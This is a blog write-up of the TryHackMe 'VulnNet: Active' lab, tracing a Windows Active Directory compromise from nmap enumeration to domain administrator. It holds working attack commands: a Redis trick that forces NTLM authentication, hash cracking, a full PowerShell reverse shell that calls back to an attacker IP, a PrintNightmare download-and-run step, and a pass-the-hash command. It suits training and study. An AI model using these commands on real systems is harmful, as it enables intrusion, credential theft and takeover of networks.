---
layout: post
title:  "VulnNet: Active (TryHackMe) Writeup"
date:   2026-01-16 13:00:00 +0530
categories: Cybersecurity 
---
This is my first time writing a proper write-up for a TryHackMe room, and I wanted to document my learning process while solving it.
The room focuses on attacking a Windows Active Directory machine, starting from enumeration and ending with full administrative access.
**TryHackMe Room**: [VulnNet: Active](https://tryhackme.com/room/vulnnetactive)

## Enumeration 
Starting with the nmap scan . 
```
sudo nmap -p 1-10000 -Pn -sC -sV -O 10.48.191.231

[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-10 09:59 IST
Nmap scan report for 10.48.161.195
Host is up (0.38s latency).
Not shown: 9993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
6379/tcp open  redis         Redis key-value store 2.8.2402
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Windows Server 2019 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-10T04:30:29
|_  start_date: N/A
|_clock-skew: -1m24s

```
## Initial Foothold

Among the discovered services, **Redis running on port 6379** stood out as unusual for a Windows domain environment. Redis is often misconfigured and, when exposed, can allow unauthorized access or credential leakage.

Because Redis commonly does **not require authentication** by default, so we can abuse Redis to to authenticate to an attacker controlled SMB share, allowing Responder to capture NTLM credentials.

 Start by running responder 
```
sudo responder -I tun0 -dwv
```

First establish a connection to the  running on the target system. Then change the Redis working directory to a UNC network path hosted on the attacker machine. It forces the window target to access the remote SMB share and automatically send NTLM authentication credentials. 
the file name (fake.txt) is arbitrary and does not need to exist.
```
redis-cli -h 10.48.191.231
  
CONFIG SET dir \\192.168.145.147\share\fake.dll
CONFIG SET dbfilename test.rdb  
Save
```

![](/assets/image/redis.png)

In Responder, the NTLM hash is captured.

![](/assets/image/ntlm.png)
save the NTLM hash to a file and crack it . I will be using hascat for this instance.
```
hashcat -m 5600 vulnet.txt /usr/share/wordlists/rockyou.txt -O

password: sand_0873959498
```
![hascat](/assets/image/hashcat.png)
## Enumerate shares
Now that we have valid credentials , we can further enumerate to gather additional information.
Using enum4linux to enumerate users, groups, shares, and other domain-related information. 
```
enum4linux -u enterprise-security -p 'sand_0873959498' -a 10.49.146.193

```

![enumerating shares](/assets/image/shares.png)

The results showed several default administrative and domain-related shares, along with a custom share named **Enterprise-Share** and it is accessible with our low privileged user . 
The next step is to list the contents of the share with smbclient .  I only discovered one file here named  PurgeIrrelevantData_1826.ps1 . 

```
smbclient //10.49.146.193/Enterprise-Share -U 'enterprise-security'

get PurgeIrrelevantData_1826.ps1

```

It seems to be a scheduled task , downloading the file and examining its content. This .ps1 deletes **all files** inside the `Public\Documents` directory without displaying errors. 

```
PurgeIrrelevantData_1826.ps1 conatins:
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```

Assuming that the script can be modified using the low privilege we can change the content of the file to get a reverse shell . I will be using a powershell reverse shell script . It will establish **reverse TCP shell** from the target machine back to the attacker.
```
#rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue  
$LHOST = "192.168.145.147"; $LPORT = 4444;   
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT);   
$NetworkStream = $TCPClient.GetStream();   
$StreamReader = New-Object IO.StreamReader($NetworkStream);   
$StreamWriter = New-Object IO.StreamWriter($NetworkStream);   
$StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024;   
while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) {   
$RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length);   
$Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) };   
if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try {   
Invoke-Expression ($Code) 2>&1 } catch { $_ };   
$StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close();   
$NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

Starting listener .
```
nc -lvnp 4444
```

Upload the file again and it will replace the .ps1 with the one uploaded .
```
put PurgeIrrelevantData_1826.ps1
```

Soon we will get the connection and navigate to  C:\Users\enterprise-security\Desktop to get the user flag . 

![user flag](/assets/image/user.png)

## Privilege Escalation 
Since the target is a **Windows machine**, the **Print Spooler service** is  considered as a potential attack vector and One well-known vulnerability affecting this service is **PrintNightmare**.

**PrintNightmare** is a critical vulnerability in the **Windows Print Spooler service** that allows **remote code execution (RCE)** and **local privilege escalation (LPE)**. When the Print Spooler service is enabled on a vulnerable system, a low-privileged user can abuse this flaw to execute arbitrary code with **SYSTEM-level privileges**.
Download the file from here https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1 and then start a server and host the file . 

```
python3 -m http.server 80
```

The next step is downloading the file onto the target system then  import the PrintNightmare  script into the current PowerShell session, making its functions available for execution and lastly trigger the exploit . 

```
certutil -urlcache -split -f http://192.168.145.147/nightmare.ps1 C:\Users\enterprise-security\Downloads\nightmare.ps1

Import-Module .\nightmare.ps1

Invoke-Nightmare

```

![](/assets/image/invoke.png)
This adds user `adm1n`/`P@ssw0rd` in the local admin group by default. 

## Post Exploitation 
After successfully escalating privileges and obtaining administrative access, using Impacket’s `secretsdump.py `,  I can dump the  **NTLM password hashes** for local and domain accounts . 

![dumping hashes](/assets/image/secretsdump.png)

After extracting the administrator hash instead of cracking it I can perform pass-the-hash attack and authenticate directly as the Administrator using Impacket’s **`wmiexec.py`** . 

```
wmiexec.py vulnnet.local/administrator@10.49.146.193 -hashes aad3b435b51404eeaad3b435b51404ee:85d1fadbe37887ed63987f822acb47f1
```

last step is navigating to the C:\Users\Administrator\Desktop and getting the root flag . 

![root flag](/assets/image/root.png)

